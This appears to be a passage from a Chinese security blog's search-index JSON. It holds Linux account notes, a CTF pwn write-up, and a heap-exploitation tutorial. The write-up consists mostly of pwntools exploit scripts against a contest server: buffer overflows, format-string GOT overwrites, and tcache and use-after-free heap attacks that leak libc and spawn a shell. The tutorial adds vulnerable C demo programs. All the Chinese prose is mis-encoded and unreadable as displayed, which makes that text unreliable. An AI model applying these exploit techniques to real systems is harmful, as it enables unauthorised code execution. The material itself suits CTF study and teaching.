çš„ç”¨æˆ·åœ¨æ­¤èŒƒå›´å†…ã€‚ ç”¨æˆ·åå’Œæ ‡è¯†å·ä¸ä¸€å®šä¸€ä¸€å¯¹åº”ï¼ŒLinuxå…è®¸å‡ ä¸ªç™»å½•åå¯¹åº”åŒä¸€ä¸ªç”¨æˆ·æ ‡è¯†å·ã€‚ ç³»ç»Ÿå†…éƒ¨ç®¡ç†è¿›ç¨‹å’Œæ–‡ä»¶è®¿é—®æƒé™æ—¶ä½¿ç”¨ç”¨æˆ·æ ‡è¯†å·ã€‚ è´¦å·å’Œæ ‡è¯†å·çš„å¯¹åº”å…³ç³»åœ¨/etc/passwdæ–‡ä»¶ä¸­ã€‚ 1.2 /etc/passwdè¯¥æ–‡ä»¶æ‰€æœ‰è€…å’Œæ‰€å±ç»„ä¸ºrootï¼Œé™¤äº†rootç”¨æˆ·å¤–åªæœ‰è¯»å–çš„æƒé™ã€‚ æ ¼å¼ä¸º ç™»å½•åï¼šå£ä»¤ï¼šç”¨æˆ·æ ‡è¯†å·ï¼šç»„æ ‡è¯†å·ï¼šæ³¨é‡Šï¼šç”¨æˆ·ä¸»ç›®å½•ï¼šShellç¨‹åº ç™»å½•åï¼šåŒæ„ç³»ç»Ÿä¸­å”¯ä¸€ï¼Œå¤§å°æ•æ„Ÿã€‚å£ä»¤ï¼šå¯†ç ï¼Œrootå’Œç”¨æˆ·å¯ä½¿ç”¨passwdå‘½ä»¤ä¿®æ”¹ã€‚ç”¨æˆ·æ ‡è¯†å·ï¼šå”¯ä¸€ã€‚ç»„æ ‡è¯†å·ï¼šæ¯ä¸ªç”¨æˆ·å¯ä»¥åŒæ—¶å±äºå¤šä¸ªç»„ã€‚æ³¨é‡Šï¼šç›¸å…³ä¿¡æ¯ï¼ŒçœŸå®å§“åã€è”ç³»ç”µè¯ç­‰ã€‚mailå’Œfingerç­‰ä¼šä½¿ç”¨è¿™äº›ä¿¡æ¯ã€‚ç”¨æˆ·ä¸»ç›®å½•ï¼šç”¨æˆ·ç™»å½•åçš„é»˜è®¤å·¥ä½œç›®å½•ã€‚rootä¸º/rootï¼Œä¸€èˆ¬ç”¨æˆ·åœ¨/homeä¸‹ã€‚Shellç¨‹åºï¼šç™»å½•åé»˜è®¤å¯åŠ¨çš„Shellç¨‹åºã€‚ 1.3 /etc/shadowåŒ…å«ç”¨æˆ·çš„å¯†ç å’Œè¿‡æœŸæ—¶é—´ï¼Œåªæœ‰rootç»„å¯è¯»å†™ã€‚ æ ¼å¼ä¸º ç™»å½•åï¼šåŠ å¯†å£ä»¤ï¼šæœ€åä¸€æ¬¡ä¿®æ”¹æ—¶é—´ï¼šæœ€å°æ—¶é—´é—´éš”ï¼šæœ€å¤§æ—¶é—´é—´éš”ï¼šè­¦å‘Šæ—¶é—´ï¼šå¯†ç ç¦ç”¨æœŸï¼šè´¦æˆ·å¤±æ•ˆæ—¶é—´ï¼šä¿ç•™å­—æ®µ ç™»å½•åï¼šç•¥ã€‚åŠ å¯†å£ä»¤ï¼š*è¡¨ç¤ºè´¦æˆ·è¢«é”å®šï¼Œï¼è¡¨ç¤ºå¯†ç è¢«é”å®šã€‚å…¶ä»–çš„å‰ä¸‰ä½è¡¨ç¤ºåŠ å¯†æ–¹å¼ã€‚æœ€åä¸€æ¬¡ä¿®æ”¹æ—¶é—´ï¼šæœ€è¿‘ä¿®æ”¹å¯†ç çš„æ—¶é—´ï¼Œå¤©ä¸ºå•ä½ï¼Œ1970å¹´1æœˆ1æ—¥ç®—èµ·ã€‚æœ€å°æ—¶é—´é—´éš”ï¼šæœ€å°ä¿®æ”¹å¯†ç çš„æ—¶é—´é—´éš”ã€‚æœ€å¤§æ—¶é—´é—´éš”ï¼šæœ€é•¿å¯†ç æœ‰æ•ˆæœŸï¼Œåˆ°æœŸè¦æ±‚ä¿®æ”¹å¯†ç ã€‚è­¦å‘Šæ—¶é—´ï¼šå¯†ç è¿‡æœŸåå¤šä¹…å‘å‡ºè­¦å‘Šã€‚å¯†ç ç¦ç”¨æœŸï¼šå¯†ç è¿‡æœŸåä»ç„¶æ¥å—çš„æœ€é•¿æœŸé™ã€‚è´¦å·å¤±æ•ˆæ—¶é—´ï¼šè´¦æˆ·çš„æœ‰æ•ˆæœŸï¼Œ1970å¹´1æœˆ1æ—¥ç®—èµ·ï¼Œç©ºä¸²è¡¨ç¤ºæ°¸ä¸è¿‡æœŸã€‚ä¿ç•™å­—æ®µï¼šä¿ç•™å°†æ¥ä½¿ç”¨ã€‚ 2.ç”¨æˆ·ç»„Linuxæœ¬èº«é¢„å®šä¹‰äº†è®¸å¤šç”¨æˆ·ç»„ï¼ŒåŒ…æ‹¬rootã€daemonã€binã€sysç­‰ï¼Œç”¨æˆ·å¯æ ¹æ®éœ€è¦è‡ªè¡Œæ·»åŠ ç”¨æˆ·ç»„ã€‚ ç”¨æˆ·ç»„æ‹¥æœ‰ç»„åã€ç»„æ ‡è¯†å·ã€ç»„æˆå‘˜ç­‰å±æ€§ã€‚ 2.1 /etc/groupæ ¼å¼ä¸º ç»„åï¼šå£ä»¤ï¼šç»„æ ‡è¯†å·ï¼šæˆå‘˜åˆ—è¡¨ 3. ç”¨æˆ·ç®¡ç†123456789101112131415161718//adduseradd [option] ç™»å½•å//å¦‚æœæ²¡æœ‰æŒ‡å®šâ€“systemå’Œâ€“groupé€‰é¡¹ï¼Œåˆ™åˆ›å»ºæ™®é€šç”¨æˆ·ã€‚adduser [option] user//deluserdel [option] ç”¨æˆ·å-fï¼šå¼ºåˆ¶åˆ é™¤ï¼ˆè°¨æ…ä½¿ç”¨ï¼‰-rï¼šä¸»ç›®å½•ä¸­çš„æ–‡ä»¶ä¸€å¹¶åˆ é™¤ã€‚//edit passwdpasswd [option] ç™»å½•å//show user informationid [option] [ç”¨æˆ·]//change usersu [option] [ç”¨æˆ·å] 4.ç”¨æˆ·ç»„ç®¡ç†æŠŠuseræ¢æˆgroup 0x07 ä¸€äº›å°é—®é¢˜1.","categories":[{"name":"linux","slug":"linux","permalink":"https://pz1o.top/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://pz1o.top/tags/linux/"}]},{"title":"CUMTCTF2020å²æœ«èµ›","slug":"CUMTCTF2020å²æœ«èµ›","date":"2020-12-26T14:32:03.000Z","updated":"2020-12-28T02:24:43.548Z","comments":true,"path":"2020/12/26/CUMTCTF2020å²æœ«èµ›/","link":"","permalink":"https://pz1o.top/2020/12/26/CUMTCTF2020%E5%B2%81%E6%9C%AB%E8%B5%9B/","excerpt":"","text":"CUMTCTF2020å²æœ«èµ›å­¦é•¿ä»¬å¯å¤ªæäº†ï¼Œæ¯”èµ›æœ€åå‚ç›´ä¸Šåˆ†å¯å¤ªç§€äº† åªæ”¾PWNçš„é¢˜è§£äº† ä¸‹é¢å‡ ä¸ªé¢˜å…ˆæ”¾é¢˜è§£ï¼Œç­‰æœŸæœ«è€ƒå®Œè¯•æ¥å¤ç° PWNPWN1\\x00æˆªæ–­ 12345678910from pwn import *p = process(\"./pwn1\")p = remote(\"219.219.61.234\",10000)payload = b\"\\x00\"*7 + p32(123)p.sendline(payload)p.interactive() PWN2åœ¨1çš„åŸºç¡€ä¸Šputsæ³„éœ² 12345678910111213141516171819202122232425262728293031323334353637383940from pwn import*#from LibcSearcher import LibcSearcherr = remote('219.219.61.234',10001)#r = process(\"./pwn2\")elf = ELF('./pwn2')libc=ELF('/lib32/libc.so.6')#context(arch=\"i386\",os=\"linux\")payload1 = '\\x00'*7 + '\\xff'r.sendline(payload1)r.recvuntil(\"you_really_know_random_haha\")put_plt = elf.plt['puts']put_got = elf.got['puts']main = 0x80486D3payload2 = b'A'*(0x6c+0x4) + p32(put_plt) + p32(main) + p32(put_got)r.sendline(payload2)print(r.recv())put = u32(r.recv()[0:4])print(hex(put))#libc = LibcSearcher('puts',put)libcbase = put - libc.symbols['puts']system = libcbase + libc.symbols['system']binsh = next(libc.search(\"/bin/sh\"))print(hex(binsh))sh = libcbase + binshpayload1 = b'\\x00'*7 + b'\\xff'r.sendline(payload1)r.recvuntil(\"you_really_know_random_haha\")print(r.recv())payload3 = b\"A\"*(0x6c+4) + p32(system) + p32(0) + p32(sh)r.sendline(payload3)r.interactive() PWN3UAF 12345678910111213141516171819202122232425262728293031323334from pwn import *#r = remote(\"219.219.61.234\",10002)r = process(\"./pwn3\")def add(size,name): r.recvuntil(\":\") r.sendline(\"1\") r.recvuntil(\":\") r.sendline(str(size)) r.recvuntil(\":\") r.sendline(name)def delete(idx): r.recvuntil(\":\") r.sendline(\"2\") r.recvuntil(\":\") r.sendline(str(idx))def show(idx): r.recvuntil(\":\") r.sendline(\"3\") r.recvuntil(\":\") r.sendline(str(idx))magic = 0x8048986add(0x30,\"AAAA\")#0add(0x30,\"BBBB\")#1delete(0)delete(1)add(0x8,p32(magic))gdb.attach(r)show(0)r.interactive() PWN4(fail)1234567891011121314151617181920212223242526272829303132from pwn import *sh = process('./pwn4')sh = remote('219.219.61.234','10003')context.log_level='debug'context(arch='amd64',os='linux')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')#libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')elf = ELF('./pwn4')puts_got = elf.got['printf']sh.recv()sh.sendline('a')sh.recv()sh.sendline('3')key = '3xpL0r3R'sh.recv()sh.sendline(str(key))payload = 'aaaa%77$p'#6sh.sendline(payload)sh.recvuntil('aaaa0x')libc_base = int(int(sh.recv(12),16) - 0x20840)log.success(hex(libc_base))#gdb.attach(sh)puts_addr = libc_base + libc.sym['puts']log.success(hex(puts_addr))gad_get = [0x45226,0x4527a,0xf0364,0xf1207]one_addr = libc_base + gad_get[0]log.success(hex(one_addr))#gdb.attach(sh)payload = fmtstr_payload(6, &#123;puts_got:one_addr&#125;)sh.sendline(payload)sh.interactive() PWN5(fail)æ·¦ è¿™ä¸ªé¢˜æˆ‘ä»¥ä¸ºç»™çš„libcå°±èƒ½ç”¨ æ²¡æƒ³åˆ°ç”¨çš„æ˜¯æœ¬æœºçš„libcç®€ç›´è¡€äº 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364from pwn import *r = remote(\"219.219.61.234\",10004)#r = process(\"./pwn5\")heap = ELF('./pwn5')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')#context.log_level = 'debug'def add(size,content): r.recvuntil(\":\") r.sendline(\"1\") r.recvuntil(\": \") r.sendline(str(size)) r.recvuntil(\": \") r.sendline(content)def change(idx,content): r.recvuntil(\":\") r.sendline(\"2\") r.recvuntil(\": \") r.sendline(str(idx)) r.recvuntil(\": \") r.sendline(content) #r.recvuntil(\":\") #r.sendline(name)def delete(idx): r.recvuntil(\":\") r.sendline(\"4\") r.recvuntil(\": \") r.sendline(str(idx))def show(idx): r.recvuntil(\":\") r.sendline(\"3\") r.recvuntil(\": \") r.sendline(str(idx))free_got = heap.got['free']add(0x18, 'AAAA') #0add(0x10, 'AAAA') #1change(0, \"/bin/sh\\x00\" + 'A'*0x10 + \"\\x41\")delete(1)#gdb.attach(r)add(0x30,p64(0)*4 + p64(0x20) + p64(heap.got['free']))show(1)r.recvuntil(\"Content: \")data = r.recvuntil(\"OK!\")free_addr = u64(data.split(\"\\n\")[0].ljust(8,'\\x00'))libc_base = free_addr -libc.symbols['free']log.success('libc base addr:'+hex(libc_base))system_addr = libc_base + libc.symbols[\"system\"]print(hex(system_addr))change(1,p64(system_addr))#gdb.attach(r)#print(hex(heap.got['free']))#add(0x10,\"/bin/sh\\x00\")#delete(2)delete(0)#delete(1)r.interactive() PWN6(fail)exp1: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970from pwn import *sh = process('./pwn6')sh = remote('219.219.61.234','10005')context.log_level = 'info'libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')#idx def add(idx,size,content): sh.recvuntil('Choice&gt;&gt; ') sh.sendline('1') sh.recvuntil(\"index&gt;&gt; \") sh.sendline(str(idx)) sh.recvuntil('size&gt;&gt; ') sh.sendline(str(size)) sh.recvuntil('name&gt;&gt; ') sh.sendline(str(content))def delete(idx): sh.recvuntil('Choice&gt;&gt; ') sh.sendline('2') sh.recvuntil(\"index&gt;&gt; \") sh.sendline(str(idx)) #sh.recvuntil('dele success')def edit(idx,content): sh.recv() sh.sendline(\"3\") sh.recv() sh.sendline(str(idx)) sh.recv() sh.sendline(str(content))def show(idx): sh.recvuntil('Choice&gt;&gt; ') sh.sendline('5') sh.recvuntil(\"index&gt;&gt; \") sh.sendline(str(idx))#leave message at bsssh.recvuntil('secret\\n')sh.sendline('aaa')sh.recvuntil('&gt;&gt; ')sh.sendline('2')#overwriteadd(0,0x130, 'aa')add(1,0x88, 'aa')delete(0)add(2,0x88,'aaaaaaa')#edit this to ....show(2)sh.recvuntil('aaaaaaa\\x0a')#sh.recv(8)libc_base = u64(sh.recv(6).ljust(8,'\\x00')) - 0x3c4ca8free_addr = libc_base + libc.sym['__free_hook']malloc_addr = libc_base + libc.sym['__malloc_hook']log.success(hex(free_addr))add(3,0x98,'aaa')#hide on 0add(4,0x98,'aaa')#hide on 0add(5,0x98,'aaa')#hide on 0add(6,0x98,'aaa')#hadd(7,0x98,'aaa')#x/30gx 0x602120 #bss_ptredit(2,0x88 * 'a' + '\\xb1')#delete(3)add(8,0x88,'aaa')#payload1 = 0x20 * 'a' + '\\x98' + 7 * '\\x00' + p64(free_addr)edit(8,payload1)#one_addr = libc_base + 0x45226 #0x4527a,0xf0364,0xf1207one_addr = libc_base + 0x4527apayload2 = p64(one_addr)edit(4,payload2)delete(4)#gdb.attach(sh)sh.interactive() exp2: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import *elf = ELF('./pwn6')# p = elf.process()p = remote('219.219.61.234','10005')# libc = ELF('libc-2.23.so')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')# context.log_level = 'debug'def enter(): p.sendlineafter(\"important secret\",\"ld1ng\") p.sendlineafter(\"&gt;&gt;\",\"2\")def add(idx,size,con): p.sendlineafter('Your Choice&gt;&gt;','1') p.sendlineafter('index&gt;&gt;',str(idx)) p.sendlineafter('size&gt;&gt;',str(size)) p.sendlineafter('name&gt;&gt;',con)def edit(idx,con): p.sendlineafter('Your Choice&gt;&gt;','3') p.sendlineafter('index&gt;&gt;',str(idx)) p.sendafter('name&gt;&gt;',con)def delete(idx): p.sendlineafter('Your Choice&gt;&gt;','2') p.sendlineafter('index&gt;&gt;',str(idx))def show(idx): p.sendlineafter('Your Choice&gt;&gt;','5') p.sendlineafter('index&gt;&gt;',str(idx))enter()add(0,128,\"aaa\")add(1,128,\"bbb\")delete(0)show(0)libc_base = u64(p.recvuntil('\\x7f')[-6:].ljust(8,'\\x00')) - 88 - 0x10 -libc.sym['__malloc_hook']info(hex(libc_base))sys = libc_base + libc.sym[\"system\"]info(hex(sys))add(2,0x88,\"ccc\")add(3,0x88,\"ddd\")add(4,0x88,\"eee\")edit(0,'a'*0x88 + '\\xd1')delete(1)add(5,0xc8,\"fff\")edit(5,p64(0)*3+p64(0x21)+p64(0)*16+p64(0)+p64(0x21)+p64(0x88)+p64(0x602080)+p64(0))p.sendline(\"ls\")# add(6,0x80,\"ld1ng\")edit(3,p64(sys))#p.sendline(\"ls\")#p.sendline(\"cat flag\")# delete(4)p.interactive() PWN7(fail)&gt;&gt;&gt; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#encoding: utf-8from pwn import *#sh = process(\"./pwn7\")sh = remote('219.219.61.234','10050')libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")def add(size, content): sh.recv() sh.sendline(\"1\") sh.recv() sh.sendline(str(size)) sh.recv() sh.sendline(str(content))def delete(idx): sh.recv() sh.sendline(\"2\") sh.recv() sh.sendline(str(idx))def show(idx): sh.recv() sh.sendline(\"3\") sh.recv() sh.sendline(str(idx))#step1: æ„é€ å‡º0x200çš„pre_sizefor i in range(10):#ç”¨åˆ°10ä¸ªå— add(0x80,'a' * 0x80)for i in range(6):#å…­ä¸ªè¿›å…¥tcahce delete(i)delete(9)#é˜²æ­¢top_chunkåˆå¹¶for i in range(6,9): delete(i)#pre_sizeåˆ†åˆ«ä¸º0x0,0x100,0x200 ï¼ˆè¿™é‡Œåˆå¹¶äº†ï¼‰#åˆ°è¿™é‡Œå…¨éƒ¨éƒ½freeæ‰äº†ï¼Œ7ä¸ªåœ¨tcache,3ä¸ªåœ¨unsorted_bin#step2: æŠŠ0x100æ”¾å…¥tcache å¹¶ç”±å—7è¿›å…¥unsorted_binæä¾›libc#å¦å¤–æ³¨æ„ä¸€ä¸‹idxfor i in range(7): #å æ»¡tcache è¿™é‡Œæ˜¯å€’ç€çš„ 6,5,4,3,2,1ï¼Œx,x,x,0 add(0x8,p64(i))add(0x8,p64(7)) #åˆ‡åˆ†unsorted_binadd(0x8,p64(8))add(0x8,p64(9)) #10ä¸ªåˆ†é…å®Œæ¯•for i in range(6): #è¿™é‡Œidx=6æ²¡æœ‰é‡Šæ”¾ ä¹Ÿå°±æ˜¯æœ€ä¸Šé¢çš„ delete(i)delete(8) #è¿›å…¥tcache å¸¦ç€0x100delete(7) #è¿›å…¥unsorted_bin æä¾›Libc add(0xf8, p64(0)) #è¿™æ¬¡åˆ†é…çš„æ˜¯idx=8çš„Bå—ï¼Œ å°†Cå—çš„inuseä½ç»™æ¸…äº†delete(6) #å¡«æ»¡tcachedelete(9) #ä¿ƒä½¿å—åˆå¹¶ï¼Œä½†å—8è¿˜åœ¨ä½¿ç”¨#step3: leak libcfor i in range(7): add(0x8, p64(i))add(0x8 ,p64(7))show(0)sh.recvuntil('&gt; ')libc_base = u64(sh.recv(6).ljust(8,\"\\x00\")) - 0x3ebca0log.success((hex(libc_base)))#gdb.attach(sh)add(0x10,'a')delete(1)delete(2)delete(0)delete(9)target = libc.symbols[\"__free_hook\"] + libc_baselog.success(hex(target))sys_addr = libc.symbols[\"system\"] + libc_baseone_addr = libc_base + 0x4f432 #0x4f2c5 add(0x10, p64(target))add(0x20, \"/bin/sh\\x00\")add(0x10, p64(one_addr))delete(1)#gdb.attach(sh)sh.interactive() æ€»ç»“åé¢å‡ ä¸ªå †é¢˜æœ‰ä¸€ä¸ªä¸Šæ¬¡æ–°ç”Ÿèµ›çš„åŸé¢˜ï¼Œä½†å°±æ˜¯åšä¸å‡ºæ¥ å †çš„ä¸œè¥¿è¿˜æ˜¯ä¸å¤ªç†Ÿæ‚‰ï¼Œæˆ‘tcl é©¬ä¸Šè€ƒè¯•äº†ï¼Œå…ˆå»å¤ä¹ äº†","categories":[{"name":"wp","slug":"wp","permalink":"https://pz1o.top/categories/wp/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://pz1o.top/tags/PWN/"},{"name":"wp","slug":"wp","permalink":"https://pz1o.top/tags/wp/"}]},{"title":"å †æ¼æ´åŠå…¶åˆ©ç”¨","slug":"å †æ¼æ´åŠå…¶åˆ©ç”¨","date":"2020-12-22T13:17:06.000Z","updated":"2021-02-06T07:06:55.326Z","comments":true,"path":"2020/12/22/å †æ¼æ´åŠå…¶åˆ©ç”¨/","link":"","permalink":"https://pz1o.top/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/","excerpt":"","text":"å †åŸºç¡€å’Œå †æ¼æ´è¿˜æ˜¯åˆ†å¼€æ¯”è¾ƒå¥½ è¿™æ ·çœ‹ç€ä¹Ÿæ¯”è¾ƒæ•´é½ å †æ¼æ´0x01 Off By One1.æ¦‚å¿µoff-by-one æ˜¯æŒ‡å•å­—èŠ‚ç¼“å†²åŒºæº¢å‡ºï¼Œè¿™ç§æ¼æ´çš„äº§ç”Ÿå¾€å¾€ä¸è¾¹ç•ŒéªŒè¯ä¸ä¸¥å’Œå­—ç¬¦ä¸²æ“ä½œæœ‰å…³ï¼Œå½“ç„¶ä¹Ÿä¸æ’é™¤å†™å…¥çš„ size æ­£å¥½å°±åªå¤šäº†ä¸€ä¸ªå­—èŠ‚çš„æƒ…å†µã€‚ 2.åˆ©ç”¨æ€è·¯(1) æº¢å‡ºå­—èŠ‚ä¸ºå¯æ§åˆ¶ä»»æ„å­—èŠ‚ï¼šé€šè¿‡ä¿®æ”¹å¤§å°é€ æˆå—ç»“æ„ä¹‹é—´å‡ºç°é‡å ï¼Œä»è€Œæ³„éœ²å…¶ä»–å—æ•°æ®ï¼Œæˆ–æ˜¯è¦†ç›–å…¶ä»–å—æ•°æ®ã€‚ (2) æº¢å‡ºå­—èŠ‚ä¸º NULL å­—èŠ‚ï¼šæº¢å‡ºçš„ä¸€ä¸ªå­—èŠ‚æ°å¥½è¦†ç›–ä¸‹ä¸€å †å—çš„sizeåŸŸçš„æœ€ä½ä½ï¼Œå°†PREV_INUSEä½ç½®0ï¼Œè¿™æ ·å‰å—ä¼šè¢«è®¤ä¸ºæ˜¯ free å—ã€‚è¿™æ—¶å¯ä»¥é€‰æ‹©ä½¿ç”¨ unlink æ–¹æ³•è¿›è¡Œå¤„ç†(åé¢å°†è¯¦ç»†ä»‹ç»)ï¼Œè¿™æ—¶ prev_size åŸŸå°±ä¼šå¯ç”¨ï¼Œå°±å¯ä»¥ä¼ªé€  prev_size ï¼Œä»è€Œé€ æˆå—ä¹‹é—´å‘ç”Ÿé‡å ã€‚ 3.æ¼”ç¤º1234567891011121314151617#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main(void)&#123; char buffer[40]=\"\"; void *chunk1; chunk1=malloc(24); puts(\"Get Input\"); sleep(0);//æ–­ç‚¹ gets(buffer); if(strlen(buffer)==24) &#123; strcpy(chunk1,buffer); &#125; return 0;&#125; è¿™ä¸ªç¨‹åºçš„é—®é¢˜åœ¨äºstrlen åœ¨è®¡ç®—é•¿åº¦çš„æ—¶å€™ä¸ä¼šæŠŠç»“æŸç¬¦ â€˜\\x00â€™ è®¡ç®—åœ¨å†…ï¼Œä½†strcpy åœ¨æ‹·è´çš„æ—¶å€™ä¼šæŠŠ â€˜\\x00â€™ ä¹Ÿç®—ä¸Šï¼Œæ‰€ä»¥å°±ä¼šé€ æˆ off by oneã€‚ æˆ‘ä»¬å…ˆæ¥è°ƒè¯•ä¸€ä¸‹ ç›´æ¥çœ‹å †æƒ…å†µ åˆ†é…24å­—èŠ‚ä¸Šé¢ä¸ºä»€ä¹ˆå †sizeä¸º0x21ä¹Ÿå°±æ˜¯33å­—èŠ‚ è¿™ä¸ªå¯ä»¥çœ‹ä¸Šé¢çš„ å› ä¸ºå®ƒä¼šæŠŠä¸‹é¢ä¸€ä¸ªpre_sizeå ç”¨ è¾“å…¥24ä¸ªA å¯ä»¥å¾ˆç›´è§‚çš„çœ‹åˆ°ç¡®å®æ˜¯æº¢å‡ºäº†ä¸€ä¸ªå­—èŠ‚ 0x02 Use After Free1.æ¦‚å¿µUse After Free(UAF)å³é‡Šæ”¾åä½¿ç”¨æ¼æ´ã€‚è‹¥å †æŒ‡é’ˆåœ¨é‡Šæ”¾åæœªç½®ç©ºï¼Œå½¢æˆæ‚¬æŒ‚æŒ‡é’ˆï¼Œå½“ä¸‹æ¬¡è®¿é—®è¯¥æŒ‡é’ˆæ—¶ï¼Œä¾ç„¶èƒ½å¤Ÿè®¿é—®åŸæŒ‡é’ˆæ‰€æŒ‡å‘çš„å †å†…å®¹ï¼Œå½¢æˆæ¼æ´ã€‚ 2.åˆ©ç”¨æ¡ä»¶ å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæ²¡æœ‰è¢«è®¾ç½®ä¸º NULL ï¼Œç„¶ååœ¨å®ƒä¸‹ä¸€æ¬¡è¢«ä½¿ç”¨ä¹‹å‰ï¼Œæ²¡æœ‰ä»£ç å¯¹è¿™å—å†…å­˜å—è¿›è¡Œä¿®æ”¹ï¼Œé‚£ä¹ˆç¨‹åºå¾ˆæœ‰å¯èƒ½å¯ä»¥æ­£å¸¸è¿è½¬ã€‚ å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæ²¡æœ‰è¢«è®¾ç½®ä¸º NULLï¼Œä½†æ˜¯åœ¨å®ƒä¸‹ä¸€æ¬¡ä½¿ç”¨ä¹‹å‰ï¼Œæœ‰ä»£ç å¯¹è¿™å—å†…å­˜è¿›è¡Œäº†ä¿®æ”¹ï¼Œé‚£ä¹ˆå½“ç¨‹åºå†æ¬¡ä½¿ç”¨è¿™å—å†…å­˜æ—¶ï¼Œå°±å¾ˆæœ‰å¯èƒ½ä¼šå‡ºç°å¥‡æ€ªçš„é—®é¢˜ã€‚ 3.æ¼”ç¤º123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef void (*func_ptr)(char *);void sys1(char command[])&#123;system(command);&#125;void echo(char content[])&#123;printf(\"%s\",content);&#125;int main()&#123; func_ptr *p1=(func_ptr*)malloc(4*sizeof(int));//ç”³è¯·äº†4ä¸ªintå¤§å°çš„å†…å­˜ printf(\"malloc addr: %p\\n\",p1);//å› ä¸ºå‰2ä¸ªä¹Ÿå°±æ˜¯0x10æ˜¯ç”¨æ¥ç®¡ç†chunkçš„ p1[2]=echo;//æ‰€ä»¥ä»ç¬¬ä¸‰ä¸ªå¼€å§‹ p1[2](\"hello world\\n\"); free(p1); //åœ¨è¿™é‡Œfreeäº†p1,ä½†å¹¶æœªå°†p1ç½®ç©º,å¯¼è‡´åç»­å¯ä»¥å†ä½¿ç”¨p1æŒ‡é’ˆ p1[2](\"hello again\\n\"); //p1æŒ‡é’ˆæœªè¢«ç½®ç©º,è™½ç„¶freeäº†,ä½†ä»å¯ä½¿ç”¨. func_ptr *p2=(func_ptr*)malloc(4*sizeof(int)); //freeä¸€å—å†…å­˜å,å†æ¬¡ç”³è¯·åŒæ ·å¤§å°çš„æŒ‡é’ˆä¼šæŠŠåˆšåˆšé‡Šæ”¾çš„å†…å­˜åˆ†é…å‡ºæ¥ printf(\"malloc addr: %p\\n\",p2); printf(\"malloc addr: %p\\n\",p1);//p2ä¸p1æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ä¸ºåŒä¸€åœ°å€ p2[2]=sys1; //åœ¨è¿™é‡Œå°†p1æŒ‡é’ˆé‡Œé¢ä¿å­˜çš„echoå‡½æ•°æŒ‡é’ˆè¦†ç›–æˆä¸ºäº†sys1æŒ‡é’ˆ. p1[2](\"/bin/sh\"); return 0;&#125; æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™ä¸ªp1å’Œp2çš„åœ°å€æ˜¯ç›¸åŒçš„ 0x03 Double Free1.æ¦‚å¿µDouble Freeæ˜¯UAFè¾ƒä¸ºç‰¹æ®Šçš„ä¸€ç§ 2.æ¼”ç¤º12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main() &#123; fprintf(stderr, \"Allocating 3 buffers.\\n\"); char *a = malloc(9); char *b = malloc(9); char *c = malloc(9); strcpy(a, \"AAAAAAAA\"); strcpy(b, \"BBBBBBBB\"); strcpy(c, \"CCCCCCCC\"); fprintf(stderr, \"1st malloc(9) %p points to %s\\n\", a, a); fprintf(stderr, \"2nd malloc(9) %p points to %s\\n\", b, b); fprintf(stderr, \"3rd malloc(9) %p points to %s\\n\", c, c); fprintf(stderr, \"Freeing the first one %p.\\n\", a); free(a); fprintf(stderr, \"Then freeing another one %p.\\n\", b); free(b); fprintf(stderr, \"Freeing the first one %p again.\\n\", a); free(a); fprintf(stderr, \"Allocating 3 buffers.\\n\"); char *d = malloc(9); char *e = malloc(9); char *f = malloc(9); strcpy(d, \"DDDDDDDD\"); fprintf(stderr, \"4st malloc(9) %p points to %s the first time\\n\", d, d); strcpy(e, \"EEEEEEEE\"); fprintf(stderr, \"5nd malloc(9) %p points to %s\\n\", e, e); strcpy(f, \"FFFFFFFF\"); fprintf(stderr, \"6rd malloc(9) %p points to %s the second time\\n\", f, f);&#125; ç›´æ¥æ ¹æ®è¾“å‡ºç†è§£å…¶ä¸­çš„åŸç† ä¹Ÿå°±æ˜¯æˆ‘ä¸Šé¢ç”»çš„è¿™ä¸ªå›¾ 0x04 overlap1.æ¦‚å¿µchunk extend æ˜¯å †æ¼æ´çš„ä¸€ç§å¸¸è§åˆ©ç”¨æ‰‹æ³•ï¼Œé€šè¿‡ extend å¯ä»¥å®ç° chunk overlapping çš„æ•ˆæœã€‚ 2.åˆ©ç”¨æ¡ä»¶ ç¨‹åºä¸­å­˜åœ¨åŸºäºå †çš„æ¼æ´ æ¼æ´å¯ä»¥æ§åˆ¶ chunk header ä¸­çš„æ•°æ® 3.æ¼”ç¤º1ï¼ˆfastbinï¼‰123456789101112131415#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(void)&#123; void *ptr,*ptr1; ptr=malloc(0x10);//åˆ†é…ç¬¬ä¸€ä¸ª0x10çš„chunk malloc(0x10);//åˆ†é…ç¬¬äºŒä¸ª0x10çš„chunk sleep(0); //æ–·é» *(long long *)((long long)ptr-0x8)=0x41;// ä¿®æ”¹ç¬¬ä¸€ä¸ªå—çš„sizeåŸŸ free(ptr); ptr1=malloc(0x30);// å®ç° extendï¼Œæ§åˆ¶äº†ç¬¬äºŒä¸ªå—çš„å†…å®¹ return 0;&#125; ç›´æ¥æ‰“æ–­ç‚¹ å¯ä»¥çœ‹åˆ°åˆ†é…äº†ä¸¤ä¸ª 